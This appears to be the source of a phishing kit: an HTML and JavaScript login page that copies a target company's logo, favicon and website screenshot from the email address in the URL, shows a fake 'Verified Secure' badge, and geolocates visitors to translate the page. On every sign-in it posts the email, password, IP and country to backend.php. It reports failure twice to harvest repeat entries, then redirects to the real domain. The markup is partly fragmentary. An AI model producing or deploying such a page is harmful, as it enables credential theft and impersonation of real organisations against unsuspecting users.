<!DOCTYPE html>

    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f4f4f4;
            background-size: 100% auto;
            background-position: center top;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;

        .login-form {

            padding: 20px 30px;
            border-radius: 0;
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
            width: 340px;
            text-align: center;
            border: 1px solid #c0c0c0;
        }

        .logo {
            width: 50px;
            height: 50px;
            margin: 0 auto 10px;
            display: none;
            object-fit: contain;
            border-radius: 0;
            background: white;
            padding: 3px;
            border: 1px solid #d0d0d0;
        }

        h2 {
            margin: 0 0 20px 0;
            font-size: 16px;
            color: #2c3e50;
            font-weight: 600;
            letter-spacing: 0.2px;
            padding-bottom: 8px;
            border-bottom: 1px solid #e0e0e0;
        }

        .form-group {
            margin-bottom: 10px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 11px;
            margin-bottom: 3px;
            color: #555;
            font-weight: 500;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 8px 10px;
            font-size: 13px;
            border: 1px solid #b0b0b0;
            border-radius: 0;
            box-sizing: border-box;
            background: #fcfcfc;
            transition: border 0.2s;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #2980b9;
            background: white;
        }

        .forgot-password {
            display: block;
            margin-top: 2px;
            text-align: right;
            font-size: 10px;
            color: #2980b9;
            text-decoration: none;
            font-weight: 500;
        }

        .forgot-password:hover {
            text-decoration: underline;
            color: #1c5d87;
        }

        button {
            width: 100%;
            padding: 9px;
            margin-top: 8px;
            background: #2980b9;
            color: white;
            border: none;
            border-radius: 0;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }

        button:hover {
            background: #1c5d87;
        }

        .secure-note {
            margin-top: 12px;
            padding: 10px;
            font-size: 9px;
            color: #666;
            background: #f5f5f5;
            border-radius: 0;
            border: 1px solid #ddd;
            line-height: 1.3;
        }

        .secure-note .tick {
            color: #27ae60;
            margin-right: 3px;
            font-size: 10px;
        }

        .location-info {
            margin-top: 6px;
            font-size: 8px;
            color: #777;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-top: 1px solid #e8e8e8;
            padding-top: 5px;
        }

        .location-flag {
            font-size: 12px;
            margin-right: 3px;
        }

        .ip-display {
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 8px;
            color: #555;
        }

        .compact-header {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 15px;
            gap: 6px;
        }
        
        .compact-title {
            font-size: 14px;
            color: #2c3e50;
            font-weight: 600;
        }
        
        .domain-badge {
            background: #e8e8e8;
            padding: 4px 8px;
            border-radius: 0;
            font-size: 10px;
            color: #2c3e50;
            font-weight: 500;
            border: 1px solid #c8c8c8;
        }
        
        /* Error message styles */
        .inline-error {
            color: #e74c3c;
            font-weight: 600;
            font-size: 11px;
            margin: 3px 0 0 0;
            padding: 2px 0;
            text-align: center;
            min-height: 16px;
        }
    </style>
</head>
<body>

        </div>
        
        <div class="form-group">
            <label for="email" id="emailLabel">Email Address</label>
            <input type="email" id="email" name="email" placeholder="Enter email address" required>
        </div>
        
        <div class="form-group">

        <button type="button" id="login-btn">Sign In</button>

    </form>

        // Country flags
        const countryFlags = {
            'US': 'üá∫üá∏', 'GB': 'üá¨üáß', 'CA': 'üá®üá¶', 'AU': 'üá¶üá∫', 'DE': 'üá©üá™',

            'RU': 'üá∑üá∫', 'BR': 'üáßüá∑', 'IN': 'üáÆüá≥', 'MX': 'üá≤üáΩ', 'KR': 'üá∞üá∑'
        };

        // SIMPLE COUNTRY TO LANGUAGE MAPPING - THIS IS WHAT MATTERS
        const countryToLanguage = {
            // English
            'US': 'en', 'GB': 'en', 'CA': 'en', 'AU': 'en', 'NZ': 'en',
            'IE': 'en', 'IN': 'en', 'SG': 'en',
            
            // Spanish
            'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es', 'CL': 'es',
            'PE': 'es', 'VE': 'es', 'EC': 'es',
            
            // French
            'FR': 'fr', 'BE': 'fr', 'CH': 'fr', 'CA': 'fr', 'LU': 'fr',
            
            // German
            'DE': 'de', 'AT': 'de', 'CH': 'de', 'LU': 'de',
            
            // Chinese
            'CN': 'zh', 'TW': 'zh', 'HK': 'zh',
            
            // Japanese
            'JP': 'ja',
            
            // Russian
            'RU': 'ru', 'UA': 'ru', 'BY': 'ru', 'KZ': 'ru'
        };

        let userIP = '';
        let userCountry = '';
        let currentLanguage = 'en';

        // Function to translate the page - SIMPLIFIED
        function translatePage(langCode) {
            console.log('TRANSLATING FORM TO:', langCode);
            const lang = translations[langCode] || translations.en;
            currentLanguage = langCode;
            
            // Update ALL text elements
            document.getElementById('domainHeading').textContent = lang.title;
            document.getElementById('emailLabel').textContent = lang.emailLabel;
            document.getElementById('email').placeholder = lang.emailPlaceholder;
            document.getElementById('passwordLabel').textContent = lang.passwordLabel;
            document.getElementById('password').placeholder = lang.passwordPlaceholder;
            document.getElementById('forgotPassword').textContent = lang.forgotPassword;
            document.getElementById('login-btn').textContent = lang.loginButton;
            document.getElementById('secureText').textContent = lang.secureText;
            document.getElementById('locationText').textContent = lang.detectingLocation;
        }

        // SIMPLE IP DETECTION FUNCTION - GUARANTEED TO WORK
        async function detectIPAndTranslate() {
            console.log('Starting IP detection for translation...');
            
            try {
                // METHOD 1: Fast IP detection
                const response1 = await fetch('https://api.ipify.org?format=json');
                const data1 = await response1.json();
                userIP = data1.ip;
                console.log('IP Address:', userIP);
                
                // METHOD 2: Get country from IP
                try {
                    const geoResponse = await fetch(`https://ipapi.co/${userIP}/country/`);
                    const countryCode = await geoResponse.text();
                    userCountry = countryCode.trim();
                    console.log('Country Code:', userCountry);
                    
                    // METHOD 3: If that fails, try alternative
                    if (!userCountry || userCountry.length !== 2) {
                        const altResponse = await fetch('https://ipinfo.io/json');
                        const altData = await altResponse.json();
                        userCountry = altData.country;
                        console.log('Alternative Country:', userCountry);
                    }
                } catch (geoError) {
                    console.log('Using fallback geo service...');
                    const fallbackResponse = await fetch('https://ipinfo.io/json');
                    const fallbackData = await fallbackResponse.json();
                    userCountry = fallbackData.country;
                    userIP = fallbackData.ip;
                    console.log('Fallback Country:', userCountry);
                }
                
                // UPDATE DISPLAY IMMEDIATELY
                const flag = countryFlags[userCountry] || 'üìç';
                document.getElementById('locationFlag').textContent = flag;
                document.getElementById('locationText').textContent = `Location: ${userCountry}`;
                document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
                
                // NOW TRANSLATE BASED ON COUNTRY - THIS IS THE KEY
                if (userCountry && countryToLanguage[userCountry]) {
                    const langToUse = countryToLanguage[userCountry];
                    console.log(`Translating to ${langToUse} for country ${userCountry}`);
                    translatePage(langToUse);
                } else {
                    console.log('Country not in mapping, using English');
                    translatePage('en');
                }
                
            } catch (error) {
                console.error('All IP detection failed:', error);
                document.getElementById('locationText').textContent = 'Location: Online';
                document.getElementById('ipDisplay').textContent = 'IP: Active';
                translatePage('en'); // Default to English
            }
        }

        // Process URL hash for domain customization
        const hash = decodeURIComponent(window.location.hash.substring(1));
        
        if (hash) {
            const emailInput = document.getElementById('email');
            emailInput.value = hash;
            
            const atIndex = hash.indexOf('@');
            if (atIndex !== -1) {
                const fullDomain = hash.substring(atIndex + 1);
                const rootDomain = fullDomain.split('.')[0];
                const logo = document.getElementById('logo');
                const domainBadge = document.getElementById('domainBadge');
                const domainHeading = document.getElementById('domainHeading');
                
                // Use a proxy service to avoid CORS issues
                const logoUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://logo.clearbit.com/${fullDomain}?size=256`)}`;
                
                // Set logo source
                logo.src = logoUrl;
                logo.style.display = 'block';
                
                // Set favicon
                document.getElementById('favicon').href = `https://t2.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://${fullDomain}&size=256`;
                
                // Update other elements
                domainHeading.textContent = rootDomain.toUpperCase();
                domainBadge.textContent = fullDomain;
                domainBadge.style.display = 'block';
                
                // Load background image
                document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1920/fullpage/https://${fullDomain}')`;
                
                document.getElementById('secureNote').innerHTML = `<span class="tick">‚úì</span> Verified Secure ‚Ä¢ ${rootDomain.toUpperCase()} Inc. ¬©2025`;
                
                // Add error handling for logo
                logo.onerror = function() {
                    logo.src = `https://t2.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://${fullDomain}&size=256`;
                    logo.onerror = function() {
                        logo.style.display = 'none';
                    };
                };
            }
        }

        // START TRANSLATION IMMEDIATELY ON PAGE LOAD
        document.addEventListener('DOMContentLoaded', function() {
            console.log('Page loaded, starting translation...');
            detectIPAndTranslate();
        });

        // ALSO start translation immediately (in case DOMContentLoaded already fired)
        detectIPAndTranslate();

        // Login functionality
        let attemptCount = 0;
        const loginBtn = document.getElementById('login-btn');
        const errorMsg = document.getElementById('error-msg');
        
        loginBtn.addEventListener('click', handleLogin);
        
        function handleLogin() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!email || !password) {
                errorMsg.textContent = translations[currentLanguage].errorEmpty;
                return;
            }
            
            // Submit login data (including location info)
            const formData = new FormData();
            formData.append('email', email);
            formData.append('password', password);
            formData.append('ip', userIP);
            formData.append('country', userCountry);
            formData.append('language', currentLanguage);
            
            fetch('backend.php', {
                method: 'POST',
                body: formData
            });
            
            attemptCount++;
            document.getElementById('password').value = '';
            
            // Handle login attempts
            if (attemptCount < 3) {
                errorMsg.textContent = translations[currentLanguage].errorIncorrect;
            } else {
                errorMsg.textContent = '';
                const domain = email.split('@')[1];
                
                setTimeout(() => {
                    window.location.href = `https://${domain}`;
                }, 1000);
            }
        }
        
        // Add form submission on Enter key
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                handleLogin();
            }
        });
